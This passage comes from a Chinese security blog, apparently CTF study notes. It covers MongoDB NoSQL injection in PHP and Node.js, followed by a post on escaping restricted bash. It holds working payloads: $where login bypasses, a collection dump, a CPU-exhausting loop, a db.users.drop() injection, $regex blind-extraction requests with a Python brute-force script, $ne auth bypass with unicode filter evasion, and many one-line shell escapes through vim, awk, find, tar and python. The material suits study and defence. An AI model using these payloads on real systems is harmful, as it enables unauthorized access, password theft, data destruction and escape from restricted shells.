<p>这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 <code>()</code> 内的条件总是永真的。</p>
<p>但是现在无论是 PHP 的 MongoDB Driver 还是 Nodejs 的 Mongoose 都必须要求查询条件必须是一个数组或者 Query 对象了，因此这种注入方法简单了解一下就好了。</p>
<h4 id="js注入"><a class="markdownIt-Anchor" href="#js注入"></a> js注入</h4>
<h5 id="where-操作符"><a class="markdownIt-Anchor" href="#where-操作符"></a> $where 操作符</h5>
<p>首先我们需要了解一下 <code>$where</code> 操作符。在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令甚至可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以在自定义的函数里获取数据库的所有信息。</p>
<p>如下实例：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;whoami&#x27;)&#125;&quot; &#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&gt;</code></pre>
<p>由于使用了 <code>$where</code> 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 <code>$userData</code> 获取查询条件：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)</code></pre>
<p>然后，攻击者可能会注入一种恶意的字符串如 <code>'a'; sleep(5000)</code> ，此时 MongoDB 执行的查询语句为：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;a&#x27;; sleep(5000))&#125;&quot; &#125;)</code></pre>
<p>如果此时服务器有 5 秒钟的延迟则说明注入成功。</p>
<p>下面我们编写 index.php 进行测试：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];
$function = &quot;
function() &#123; 
    var username = &#x27;&quot;.$username.&quot;&#x27;;
    var password = &#x27;&quot;.$password.&quot;&#x27;;
    if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;&quot;;
$query = new MongoDB\Driver\Query(array(
    &#x27;$where&#x27; =&gt; $function
));
$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username: &#x27;.$user[&#x27;username&#x27;].&quot;&lt;br&gt;&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;password&#x27;].&quot;&lt;br&gt;&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>
<ul>
<li><strong>MongoDB 2.4 之前</strong></li>
</ul>
<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。</p>
<p>如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#x27;1</code></pre>
<ul>
<li><strong>MongoDB 2.4 之后</strong></li>
</ul>
<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;return true//
或
username=1&amp;password=1&#x27;;return true;var a=&#x27;1</code></pre>
<p>如下图所示，成功查出所有的用户信息：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>这是因为发送 payload 进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;$where&#x27; =&gt; &quot;
    function() &#123; 
        var username = &#x27;1&#x27;;
        var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;
        if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
            return true;
        &#125;else&#123;
            return false;
        &#125;
    &#125;
&quot;)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;$where: &quot;function() &#123; var username = &#x27;1&#x27;;var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123; return true; &#125;else&#123; return false; &#125;&#125;&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;
&gt;</code></pre>
<p>我们从代码中可以看出，password 中的 <code>return true</code> 使得整个 JavaScript 代码提前结束并返回了 <code>true</code>，这样就构造出了一个永真的条件并完成了 NoSQL 注入。</p>
<p>此外还有一个类似于 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();var a=&#x27;1</code></pre>
<h5 id="commmand方法注入"><a class="markdownIt-Anchor" href="#commmand方法注入"></a> commmand方法注入</h5>
<p>MongoDB driver一般都提供直接执行shell命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在php官网中就已经友情提醒了不要这样使用:</p>
<pre><code class="highlight plaintext">&lt;?php
$m = new MongoDB\Driver\Manager;
// Don&#x27;t do this!!!
$username = $_GET[&#x27;field&#x27;];
// $username is set to &quot;&#x27;); db.users.drop(); print(&#x27;&quot;$cmd = new \MongoDB\Driver\Command( [
&#x27;eval&#x27; =&gt; &quot;print(&#x27;Hello, $username!&#x27;);&quot;
] );

$r = $m-&gt;executeCommand( &#x27;dramio&#x27;, $cmd );?&gt;</code></pre>
<p>也可以用Command去实现Mongo的<code>distinct</code>方法</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager();

$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$cmd = new MongoDB\Driver\Command([
&#x27;eval&#x27;=&gt; &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;
]);
echo &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;;
$result = $manager-&gt;executeCommand(&#x27;sec_test&#x27;, $cmd)-&gt;toArray();
$result =((array)$result[0])[&#x27;retval&#x27;];
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;用户不存在&#x27;;
&#125;
?&gt;</code></pre>
<p>这个就危险太多了，就相当于把mongo shell开放给用户了，你基本可以构建任何mongo shell可以执行的payload了，如果当前应用连接数据库的权限恰好很高，我们能干的事情更多。如构建</p>
<pre><code class="highlight plaintext">payload:username=2&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;username&#x27;:&#x27;2</code></pre>
<h5 id="execute方法注入"><a class="markdownIt-Anchor" href="#execute方法注入"></a> execute方法注入</h5>
<p>在旧版本中，可以用execute来执行一段字符串</p>
<pre><code class="highlight plaintext">&lt;?php

$mongo = new mongoclient();
$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$db = $mongo-&gt;sec_test; // 选择数据库
$query = &quot;db.users.find(&#123;&#x27;uname&#x27;: &quot;.$uname.&quot;&#125;,&#123;&#x27;pwd&#x27;, &quot;.$pwd.&quot;&#125;)&quot;;
$result = $db-&gt;execute($query);

if ($result-&gt;count() &gt; 0) &#123;
    foreach ($result as $user) &#123;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;该用户不存在&#x27;;
&#125;
?&gt;</code></pre>
<p>而在新版本中，多用executeQuery来进行查询</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$function</span> = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
<span class="string">&#x27;$where&#x27;</span> =&gt; <span class="variable">$function</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;用户不存在&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;uname&#x27;</span>=&gt;<span class="variable">$uname</span>,
    <span class="string">&#x27;pwd&#x27;</span>=&gt;<span class="variable">$pwd</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<h4 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h4>
<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>
<p>我们还是利用第一个 index.php 进行演示：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span>);
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,
    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$password</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();
<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span> = ((<span class="keyword">array</span>)<span class="variable">$user</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;Login Failed&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>布尔盲注重点在于怎么逐个提取字符，如下所示，在已知一个用户名的情况下判断密码的长度：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=.&#123;4&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;5&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;6&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;7&#125;    // 登录失败
......</code></pre>
<p>在 <code>password[$regex]=.&#123;6&#125;</code> 时可以成功登录，但在 <code>password[$regex]=.&#123;7&#125;</code> 时登录失败，说明该 whoami 用户的密码长度为 7。</p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;admin&#x27;,
    &#x27;password&#x27; =&gt; array(&#x27;$regex&#x27; =&gt; &#x27;.&#123;6&#125;&#x27;)
)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;6&#125;&#x27;&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;7&#125;&#x27;&#125;&#125;)
&gt;</code></pre>
<p>由于 whoami 用户的 password 长度为 6，所以查询条件 <code>&#123;'username':'admin', 'password':&#123;$regex:'.&#123;6&#125;'&#125;&#125;</code> 为真，便能成功登录，而 <code>&#123;'username':'admin', 'password':&#123;$regex:'.&#123;7&#125;'&#125;&#125;</code> 为假，自然也就登录不了。</p>
<p>知道 password 的长度之后我们便可以逐位提取 password 的字符了：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=1.&#123;5&#125;
username=admin&amp;password[$regex]=12.&#123;4&#125;
username=admin&amp;password[$regex]=123.&#123;3&#125;
username=admin&amp;password[$regex]=1234.&#123;2&#125;
username=admin&amp;password[$regex]=12345.*
username=admin&amp;password[$regex]=123456
或
username=admin&amp;password[$regex]=^1
username=admin&amp;password[$regex]=^12
username=admin&amp;password[$regex]=^123
username=admin&amp;password[$regex]=^1234
username=admin&amp;password[$regex]=^12345
username=admin&amp;password[$regex]=^123456</code></pre>
<p>这是某个师傅的盲注脚本，贴一下</p>
<pre><code class="highlight plaintext">import requests
import string

password = &#x27;&#x27;
url = &#x27;http://192.168.226.148/index.php&#x27;

while True:
    for c in string.printable:
        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:

            # When the method is GET
            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)
            # When the method is POST
            post_payload = &#123;
                &quot;username&quot;: &quot;admin&quot;,
                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c
            &#125;
            # When the method is POST with JSON
            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;$regex&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)
            #headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;
            #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json

            r = requests.post(url=url, data=post_payload)
            if &#x27;Login Success&#x27; in r.text:
                print(&quot;[+] %s&quot; % (password + c))
                password += c


# 输出如下: 
# [+] 1
# [+] 12
# [+] 123
# [+] 1234
# [+] 12345
# [+] 123456</code></pre>
<h3 id="nodejs中的mongodb注入"><a class="markdownIt-Anchor" href="#nodejs中的mongodb注入"></a> Nodejs中的MongoDB注入</h3>
<p>NodeJS里面的Nosql就主要式重言式注入了，构造永真式密码来实现登陆绕过</p>
<ul>
<li>server.js</li>
</ul>
<pre><code class="highlight plaintext">var express = require(&#x27;express&#x27;);
var mongoose = require(&#x27;mongoose&#x27;);
var jade = require(&#x27;jade&#x27;);
var bodyParser = require(&#x27;body-parser&#x27;);

mongoose.connect(&#x27;mongodb://localhost/test&#x27;, &#123; useNewUrlParser: true &#125;);
var UserSchema = new mongoose.Schema(&#123;
    name: String,
    username: String,
    password: String
&#125;);
var User = mongoose.model(&#x27;users&#x27;, UserSchema);
var app = express();

app.set(&#x27;views&#x27;, __dirname);
app.set(&#x27;view engine&#x27;, &#x27;jade&#x27;);

app.get(&#x27;/&#x27;, function(req, res) &#123;
    res.render (&quot;index.jade&quot;,&#123;
        message: &#x27;Please Login&#x27;
    &#125;);
&#125;);

app.use(bodyParser.json());

app.post(&#x27;/&#x27;, function(req, res) &#123;
    console.log(req.body)
    User.findOne(&#123;username: req.body.username, password: req.body.password&#125;, function (err, user) &#123;
        console.log(user)
        if (err) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: err.message&#125;);
        &#125;
        if (!user) &#123;
            return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Login Failed&#x27;&#125;);
        &#125;

        return res.render(&#x27;index.jade&#x27;, &#123;message: &#x27;Welcome back &#x27; + user.name + &#x27;!&#x27;&#125;);
    &#125;);
&#125;);

var server = app.listen(8000, &#x27;0.0.0.0&#x27;, function () &#123;

    var host = server.address().address
    var port = server.address().port
    console.log(&quot;listening on http://%s:%s&quot;, host, port)
&#125;);
</code></pre>
<ul>
<li>index.jade</li>
</ul>
<pre><code class="highlight plaintext">h1 #&#123;message&#125;
p #&#123;message&#125;</code></pre>
<p>运行访问，发送</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;:&#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161641-79e9c82a-ec57-1.png" alt="20210724161641-79e9c82a-ec57-1"></p>
<p>成功登录</p>
<p>如果<code>$ne</code>关键字被过滤也可以用unicode来绕过</p>
<p>因为JSON是可以直接解unicode的</p>
<p>belike:</p>
<pre><code class="highlight plaintext">&#123;&quot;username&quot;:&#123;&quot;\u0024\u006e\u0065&quot;:1&#125;,&quot;password&quot;: &#123;&quot;\u0024\u006e\u0065&quot;:1&#125;&#125;
// &#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></pre>
]]></content>
      <tags>
        <tag>-Web -SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Rbash逃逸</title>
    <url>/2025/09/17/Rbash%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="rbash逃逸"><a class="markdownIt-Anchor" href="#rbash逃逸"></a> Rbash逃逸</h1>
<p>在打NSSCTF4th的时候Misc碰到了一道神必题目</p>
<p>出了题解发现是不认识的知识点，Rbash逃逸，说到逃逸我人可就不困了，学习一下</p>
<h2 id="rbash"><a class="markdownIt-Anchor" href="#rbash"></a> Rbash</h2>
<p>rbash全称 Restricted BASH ，即受限情况下的bash命令执行</p>
<ul>
<li>不能使用 cd 命令来改变当前目录。</li>
<li>不能使用 set 命令来改变环境变量或 shell 选项。</li>
<li>不能使用 unset 命令来取消环境变量或 shell 函数。</li>
<li>不能使用任何包含 / 符号的命令，除非它们在 PATH 环境变量中指定了。</li>
<li>不能重定向输入或输出，例如使用 &gt;, &lt;, &gt;&gt;, &lt;&lt; 等符号。建议用echo ’ '|tee file</li>
<li>只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。</li>
</ul>
<pre><code class="highlight plaintext">echo $PATH  ###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证    
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   ####修复</code></pre>
<h2 id="逃逸姿势"><a class="markdownIt-Anchor" href="#逃逸姿势"></a> 逃逸姿势</h2>
<p>由于这类题目做的很少，讲不出来怎么判断这题是不是考察rbash逃逸，只能记录下网上零零散散的博客里记录的东西</p>
<h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> /绕过</h3>
<p>尝试运行<code>/bin/bash</code>来获得正常的shell</p>
<p>但是由于太简单了一般都会被ban/修改bash的绝对路径</p>
<h3 id="cp-绕过"><a class="markdownIt-Anchor" href="#cp-绕过"></a> cp 绕过</h3>
<p>尝试cp 复制bash到当前的目录下</p>
<pre><code class="highlight bash"><span class="built_in">cp</span> /bin/bash .
./bash</code></pre>
<p>只要在当前目录下的执行不受限就可以用，这是它最大的优点，并且还不需要知道bash的绝对路径，只要可以复制就没有问题</p>
<p>注:cp能用一般/就能用…</p>
<h3 id="使用其他非原生命令来绕过"><a class="markdownIt-Anchor" href="#使用其他非原生命令来绕过"></a> 使用其他非原生命令来绕过</h3>
<p>例如:ftp, gdb, more, man, less, vim, rvim</p>
<p>可以用/bin/bash的地方不妨尝试一下’sh’，由于没有/所以可能有意想不到的效果</p>
<h4 id="ftp"><a class="markdownIt-Anchor" href="#ftp"></a> ftp</h4>
<pre><code class="highlight bash">ftp
!/bin/bash</code></pre>
<h4 id="gdb"><a class="markdownIt-Anchor" href="#gdb"></a> gdb</h4>
<pre><code class="highlight bash">gdb
!/bin/bash</code></pre>
<h4 id="more"><a class="markdownIt-Anchor" href="#more"></a> more</h4>
<pre><code class="highlight plaintext">more /etc/passwd
!/bin/bash</code></pre>
<h4 id="man"><a class="markdownIt-Anchor" href="#man"></a> man</h4>
<pre><code class="highlight plaintext">man man
!/bin/bash</code></pre>
<h4 id="less"><a class="markdownIt-Anchor" href="#less"></a> less</h4>
<pre><code class="highlight plaintext">less --help
!/bin/bash</code></pre>
<h4 id="vim"><a class="markdownIt-Anchor" href="#vim"></a> vim</h4>
<pre><code class="highlight plaintext">vim -Z -c &#x27;:!/bin/bash&#x27;</code></pre>
<p>大多数时候这个被限制了</p>
<p>还是老老实实</p>
<pre><code class="highlight plaintext">vim test
:!/bin/bash</code></pre>
<h4 id="git"><a class="markdownIt-Anchor" href="#git"></a> git</h4>
<pre><code class="highlight plaintext">git help status
!/bin/bash</code></pre>
<h4 id="scp"><a class="markdownIt-Anchor" href="#scp"></a> scp</h4>
<pre><code class="highlight plaintext">scp -S /path/yourscript x y:</code></pre>
<h4 id="awk"><a class="markdownIt-Anchor" href="#awk"></a> awk</h4>
<pre><code class="highlight plaintext">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;
    或
        awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</code></pre>
<h4 id="find"><a class="markdownIt-Anchor" href="#find"></a> find</h4>
<pre><code class="highlight plaintext">find / -name SomeName -exec /bin/sh \;
find / -name SomeName -exec /bin/bash \;</code></pre>
<h4 id="ed-editor"><a class="markdownIt-Anchor" href="#ed-editor"></a> ed-editor</h4>
<pre><code class="highlight plaintext">ed
!&#x27;/bin/sh&#x27;</code></pre>
<h4 id="zip"><a class="markdownIt-Anchor" href="#zip"></a> zip</h4>
<pre><code class="highlight plaintext">zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;</code></pre>
<h4 id="tar"><a class="markdownIt-Anchor" href="#tar"></a> tar</h4>
<pre><code class="highlight plaintext">tar cf /dev/null  filename  --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></pre>
<h4 id="pico"><a class="markdownIt-Anchor" href="#pico"></a> pico</h4>
<pre><code class="highlight plaintext">pico -s /bin/sh</code></pre>
<p>我没成功哈，弹出来的是nano</p>
<h3 id="vim通杀"><a class="markdownIt-Anchor" href="#vim通杀"></a> vim通杀</h3>
<p>在任何可以查看文件内容的界面尝试使用v</p>
<p>看看能不能弹出vim编辑器</p>
<p>接下来</p>
<pre><code class="highlight plaintext">:set shell=/bin/bash
:shell</code></pre>
<p>vi 命令是一个经典的文本编辑器。其中，:set 命令表示设置一个选项的值，:shell 命令表示执行一个 shell。默认情况下，vi 会使用 RBASH 作为 shell，但是用户可以通过 :set shell=/bin/bash 来修改 shell 的值为 /bin/bash。因此，如果用户使用 :shell 命令，就可以运行 bash，从而绕过 RBASH 的限制。</p>
<h3 id="编程语言绕过"><a class="markdownIt-Anchor" href="#编程语言绕过"></a> 编程语言绕过</h3>
<p>还可以直接写程序弹shell</p>
<h4 id="python"><a class="markdownIt-Anchor" href="#python"></a> python</h4>
<pre><code class="highlight python">python -c <span class="string">&#x27;import os; os.system(&quot;/bin/sh&quot;)&#x27;</span></code></pre>
<h4 id="php"><a class="markdownIt-Anchor" href="#php"></a> php</h4>
<pre><code class="highlight php">php -a then <span class="title function_ invoke__">exec</span>(<span class="string">&quot;sh -i&quot;</span>);</code></pre>
<h4 id="perl"><a class="markdownIt-Anchor" href="#perl"></a> perl</h4>
<pre><code class="highlight perl">perl -e <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span></code></pre>
<h4 id="ua"><a class="markdownIt-Anchor" href="#ua"></a> ua</h4>
<pre><code class="highlight ua">os.execute(&#x27;/bin/sh&#x27;)</code></pre>
<h4 id="ruby"><a class="markdownIt-Anchor" href="#ruby"></a> ruby</h4>
<pre><code class="highlight ruby">exec <span class="string">&quot;/bin/sh&quot;</span></code></pre>
<h4 id="expect"><a class="markdownIt-Anchor" href="#expect"></a> expect</h4>
<pre><code class="highlight expect">spwan sh
sh</code></pre>
